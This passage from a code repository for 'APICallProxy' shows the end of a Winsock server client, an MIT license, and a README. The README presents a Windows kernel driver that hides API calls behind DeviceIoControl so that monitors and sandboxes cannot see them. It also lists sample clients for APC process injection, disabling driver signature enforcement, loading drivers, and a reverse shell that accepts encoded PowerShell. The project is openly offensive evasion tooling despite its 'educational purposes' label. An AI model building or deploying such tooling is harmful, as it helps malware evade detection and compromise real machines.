	printf("[+] Connection Accepted Successfully\n");


	do {

		SendRecvStruct RecvInfo = {0};
		char RecvBuffer[1024] = { 0 };
		RecvInfo.Socket = AcceptInfo.NewSocket;
		RecvInfo.Buffer = RecvBuffer;
		RecvInfo.BufferLen = 1024;
		Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Recv, &RecvInfo, sizeof(SendRecvStruct), NULL, NULL, &returned, FALSE);
		if (!Status) {
			printf("[-] Failed To Recive Data From Client Side Error Code: 0x%x\n", GetLastError());
			break;
		}
		
		printf("[+] Client: %s\n", RecvBuffer);

		SendInfo.Socket = AcceptInfo.NewSocket;
		CHAR SendBufer[] = "Hello From Server Side\n";
		SendInfo.Buffer = SendBufer;
		SendInfo.BufferLen = 24;
		Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Send, &SendInfo, sizeof(SendRecvStruct), NULL, NULL, &returned, FALSE);
		if (!Status) {
			printf("[-] Failed to Replay to the Client Error Code: 0x%x\n", GetLastError());
			break;
		}

		printf("[+] Server: %s\n", SendBufer);
		
		Sleep(1000);

	} while (1);


	CleanUp:
	
	if (SocketInfo.Socket != NULL) {
		Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CloseSocket, &SocketInfo.Socket, sizeof(PVOID), NULL, NULL, &returned, FALSE);
		if (!Status) {
			printf("[-] Failed Close Socket Error Code: 0x%x\n", GetLastError());
		}
	}

	if (AcceptInfo.NewSocket != NULL) {
		Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CloseSocket, &AcceptInfo.NewSocket, sizeof(PVOID), NULL, NULL, &returned, FALSE);
		if (!Status) {
			printf("[-] Failed Close Socket Error Code: 0x%x\n", GetLastError());
		}
	}

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_WSACleanup, &WSAInfo, sizeof(WSAStartCleanUp), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed To Terminates use of the Winsock Error Code: 0x%x\n", GetLastError());
	}

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CLOSE_HANDLE, &hDevice, sizeof(HANDLE), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed To Close the Driver handle Error Code: 0x%x\n", GetLastError());
	}

	return 0;
}
```

`LICENSE`:

```
MIT License

Copyright (c) 2022 MahmoudZohdy

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`README.md`:

```md
# APICallProxy

This Project is for Windows API Call Obfuscation to make static/Dynamic analysis of a program harder, and to make it harder to recognize and extract the sequance of Windows API the application Call.

It is a Kernel Proxy that gives the developer the ability to proxy windows API call and hide it behind **DeviceIoControl()** API, so instead of calling **CreateFile()** you will call **DeviceIoControl(,IOCTL_API_PROXY_CREATEFILE,)**, so if there is an API monitor tool or a sandbox all what are you going to see is a sequence of **DeviceIoControl()** calls.

To make it clearer if you want to do for example APC injection you would normally call those sequence of API
 **OpenProcess()** , **VirtualAllocEx()**, **WriteProcessMemory()**, **OpenThread()**, **QueueUserAPC()**

But with APICallProxy this is what the API calls would look like.

1- **DeviceIoControl(,IOCTL_API_PROXY_OPEN_PROCESS,)**

2- **DeviceIoControl(,IOCTL_API_PROXY_ALLOCATE_MEMORY_IN_PROCESS_USING_HANDLE,)**

3- **DeviceIoControl(,IOCTL_API_PROXY_WRITE_PROCESS_MEMORY,)**

4- **DeviceIoControl(,IOCTL_API_PROXY_OPEN_THREAD,)**

5- **DeviceIoControl(,IOCTL_API_PROXY_QUEUE_APC,)**


To use it all what you need to do is Call **DeviceIoControl** with the appropriate **IOCTL** code insted of calling normal Windows API like **CreateFile**, **WriteFile**, **OpenProcess**,..


```
I Create sample Client that will do the following:
1 - APCInjection.exe : APC injection 
2 - DisableDSE.exe : Sample code to Disable Signing Policy(DSE), tested on windows 10 21H1 (it might crash on other windows version)
3-  RegisterLoadDriver.exe : Register and Load Driver using DeviceIoControl()
4-  WinsockServer.exe  :  WinSock Server same as Microsoft implementation (https://docs.microsoft.com/en-us/windows/win32/winsock/complete-server-code)
5-  WinsockClient.exe  :  WinSock Client same as Microsoft implementation (https://docs.microsoft.com/en-us/windows/win32/winsock/complete-client-code)
6-  ReverseShellClient.exe: Reverse Shell Client
7-  ReverseShellServer.exe: Reverse Shell Server (it can support command up to 99 character (can be increased from the code) for example: powershell.exe -encodedCommand "Base64 Script")

Note that the APCInjector.exe only work as x64 bit application on x64 bit windows because the shellcode is x64 bit

i tested the Driver and the client on windows 10 0x64 and window 8.1 x64/x86 bit

Note that the network operation only support the TCP connection for now, will add UDP connection soon.

The Communication Between the Driver and User-mode happens using METHOD_NEITHER i made it very easy to change the communication method (METHOD_BUFFERED,..), you only need to change a couple of lines in the source code and it will work normally
```


 
# Windows API:

- [x] **CreateFile**
- [x] **OpenFile**
- [x] **DeleteFile**
- [x] **WriteFile**
- [x] **ReadFile**
- [x] **OpenProcess**
- [x] **TerminateProcess**
- [x] **OpenThread**
- [x] **CloseHandle**
- [x] **GetFileSize**
- [x] **ZwQuerySystemInformation**
- [x] **ZwAllocateVirtualMemory**
- [x] **ZwFreeVirtualMemory**
- [x] **VirtualProtectEx**
- [x] **WriteProcessMemory**
- [x] **ReadProcessMemory**
- [x] **NtSuspendProcess**
- [x] **NtResumeProcess**
- [x] **ZwCreateSection**
- [x] **ZwOpenSection**
- [x] **ZwMapViewOfSection**
- [x] **ZwUnmapViewOfSection**
- [x] **SetThreadContext**
- [x] **GetThreadContext**
- [ ] **CreateThread**
- [ ] **CreateRemoteThread**
- [ ] **ResumeThread**
- [ ] **SuspendThread**
- [x] **RegCreateKey**
- [x] **RegDeleteKey**
- [x] **RegQueryValue**
- [x] **RegSetValue**
- [x] **ZwLoadDriver**
- [x] **ZwUnloadDriver**
- [x] **WSAStartup**
- [x] **WSACleanup**
- [x] **GetAddrInfo**
- [x] **FreeAddrInfo**
- [x] **Socket**
- [x] **CloseSocket**
- [x] **Connect**
- [x] **Listen**
- [x] **Bind**
- [x] **Accept**
- [x] **Send**
- [x] **Recv**

- [x] **Get_ProcessID_From_Process_Name**         not windows API but usefull utility (can use ZwQuerySystemInformation to do the same)


Kindly note that this is only for educational purposes only

# Reference

https://github.com/hfiref0x/DSEFix 

https://github.com/wbenny/KSOCKET

# License:
MIT

```